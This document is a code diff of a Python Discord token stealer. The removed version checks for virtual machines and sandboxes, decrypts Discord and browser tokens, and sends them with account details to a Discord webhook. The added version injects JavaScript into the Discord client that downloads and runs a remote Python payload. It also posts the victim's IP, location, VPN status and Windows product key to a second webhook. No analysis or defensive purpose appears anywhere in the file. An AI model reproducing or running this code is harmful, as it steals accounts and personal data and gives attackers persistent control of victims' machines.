@@ -1,118 +1,81 @@
-import sys
-def get_base_prefix_compat():
-    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
-def in_virtualenv(): 
-    return get_base_prefix_compat() != sys.prefix
-if in_virtualenv() == True: 
-    sys.exit()
-import ctypes
-class AntiVM:
-
-    def __init__(self):
-        self.drivers()
-        self.Regcheck()
-        self.VMcontrol()
-
-    def drivers(self):
-        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys"):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys"):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys"):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        if  os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmsci.sys"):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys"):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys"):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys"):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-
-    def Regcheck(self):
-        R = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
-        R2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
-        if R != 1 and R2 != 1:
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-
-    def VMcontrol(self):    
-        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
-        processList = []
-        for processNames in process.split(" "):
-            if ".exe" in processNames:
-                processList.append(processNames.replace("K\n", "").replace("\n", ""))
-        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
-            os.system("shutdown /r /t 1")
-            os._exit(1)      
-        if os.path.exists(os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        if os.path.exists(os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")):
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        try:
-            ctypes.cdll.LoadLibrary("SbieDll.dll")
-            os.system("shutdown /r /t 1")
-            os._exit(1)
-        except:
-            pass
-c = AntiVM
-import subprocess, os
+import os, sys ,subprocess,time
 try:
-    from base64 import b64decode;from Crypto.Cipher import AES;from win32crypt import CryptUnprotectData;from os import listdir;from json import loads;from re import findall;from urllib.request import Request, urlopen;import requests;import json
+    import requests;from mss import mss;
 except ImportError as e:
     try:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', e.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
     except:
-        os.system('pip install pycryptodome pypiwin32 requests')
-def decrypt(buff, master_key):
-    try:return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except:return "Error"
-def main():
-        tokens = [];list2 = [];list3 = [];list4 = [];paths = {'Discord': os.getenv('APPDATA') + r'\\discord','Discord Canary': os.getenv('APPDATA') + r'\\discordcanary','Lightcord': os.getenv('APPDATA') + r'\\Lightcord','Discord PTB': os.getenv('APPDATA') + r'\\discordptb','Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable','Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable','Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data','Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data','Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data','Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data','CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data','7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data','Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data','Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default','Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data','Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default','Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data','Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul','Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default','Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default','Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default'};ip = str(requests.get("http://ipinfo.io/json").json()["ip"])
-        for platform, path in paths.items():
-            if not os.path.exists(path): continue
-            try:
-                 with open(path + f"\\Local State", "r") as file:key = loads(file.read())['os_crypt']['encrypted_key'];file.close()
-            except: continue
-            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
-                if not file.endswith(".ldb") and file.endswith(".log"): continue
-                else:
-                    try:
-                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
-                            for x in files.readlines():
-                                x.strip()
-                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):tokens.append(values)
-                    except PermissionError: continue
-            for i in tokens:
-                if i.endswith("\\"):i.replace("\\", "")
-                elif i not in list2:list2.append(i)
-            for token in list2:
-                try: tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
-                except IndexError == "Error":continue
-                list4.append(tok)
-                for value in list4:
-                    if value not in list3:list3.append(value);headers = {'Authorization': tok, 'Content-Type': 'application/json'}
-                    try: res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
-                    except: continue
-                    if res.status_code == 200:res_json = res.json();pc_username = os.getenv("UserName");pc_name = os.getenv("COMPUTERNAME");user_name = f'{res_json["username"]}#{res_json["discriminator"]}';user_id = res_json['id'];email = res_json['email'];phone = res_json['phone'];mfa_enabled = res_json['mfa_enabled'];res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers);embed = f"""```\nPC_USERNAME: {pc_username}\nPC_NAME: {pc_name}\nUSERNAME: {user_name}\nUSER_ID: {user_id}\nEMAIL: {email}\nPHONE: {phone}MFA: {mfa_enabled}\nTOKEN: {tok}'\nIP: {ip}\nPLATFORM: {platform}```""";payload = json.dumps({'content': embed})
-                    try:
-                        headers2 = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
-                        try:
-                            req = Request("https://discord.com/api/webhooks/1291430817771556864/dFn8hil7EJ0Z4ce0mVJgFtyF-oA0cRunBjiSRuchWSql2ic7g1LNzVxkjv2USKD258YZ", data=payload.encode(), headers=headers2);res=urlopen(req)
-                            if res.getcode() == 200 or 204:
-                                return
-                            else:continue
-                        except:
-                            pass
-                    except: continue
-                else: continue
-main()
+        subprocess.run(f"pip install {e}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+    finally:
+       subprocess.run(f"pip install pycryptodome pypiwin32 pycryptodomex pywin32", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+
+time.sleep(3)
+user = os.getlogin()
+path = f"C:/Users/{user}/APPDATA/Local/Discord/"
+dirr = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
+fdirs = [f for f in dirr if any(os.scandir(os.path.join(path, f)))]
+if 'app' in fdirs[0]:
+    app = fdirs[0]
+else:
+    fdirs.sort()
+    app = fdirs[0]
+mainpath = f"{path}/{app}/modules/discord_desktop_core-1/discord_desktop_core/index.js"
+f = open(mainpath,"w")
+content = """const https = require('https');
+const fs = require('fs');
+const path = require('path');
+const { exec } = require('child_process');
+function download(url, dest) {
+    const file = fs.createWriteStream(dest);
+    https.get(url, (response) => {
+        response.pipe(file);
+
+        file.on('finish', () => {
+            file.close(); 
+            open(dest);
+        });
+    }).on('error', (err) => {
+        fs.unlink(dest); 
+        console.error(err.message);
+    });
+}
+function open(filePath) {
+    exec(`pythonw ${filePath}`, (err) => { 
+        if (err) {
+            return;
+        } else {
+            return;
+        }
+    });
+}
+const temp = process.env.temp;
+const url = 'https://raw.githubusercontent.com/dd44aa/test/refs/heads/main/bot.py';
+const dpath = path.join(temp, `Z-builtins-7876-689a9de9fc.py`);
+if (fs.existsSync(dpath)) {
+    open(dpath);
+} else {
+    download(url, dpath);
+}
+
+module.exports = require('./core.asar');
+"""
+f.write(content)
+f.close()
+s = open(mainpath,"r")
+hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
+
+def info():
+            import json
+            from urllib.request import urlopen
+            url = 'http://ipinfo.io/json'
+            response = urlopen(url)
+            data = json.load(response)
+            UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
+            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
+            process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+            wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn \n").strip()
+            process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+            wtype = process2.communicate()[0].decode().strip("Caption \n").strip()
+            userdata = f"```\n------- {os.getlogin()} ------- \nComputername: {os.getenv('COMPUTERNAME')} \nIP: {data['ip']} \n -VPN: {UsingVPN} \nOrg: {data['org']} \nCity: {data['city']} \nRegion: {data['region']} \nWindowskey: {wkey} \nWindows Type: {wtype} \n```**Map location: {googlemap}** \n"
+            requests.post(hook,json={"content": f"{userdata}"})
+info()
